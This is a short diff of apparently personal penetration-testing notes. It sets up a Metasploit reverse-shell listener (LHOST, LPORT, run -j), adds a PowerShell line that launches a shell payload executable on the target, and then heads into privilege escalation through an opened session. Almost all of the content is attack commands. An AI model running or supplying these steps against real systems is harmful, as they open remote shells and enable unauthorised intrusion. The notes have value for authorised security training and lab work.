@@ -20,6 +20,7 @@ set LHOST 1.1.1.1  // your machine ip
 set LPORT 8888
 run -j
 
+powershell Start-Process "shell-name.exe"
 
 Privilege Escalation
 sessions -i (id)
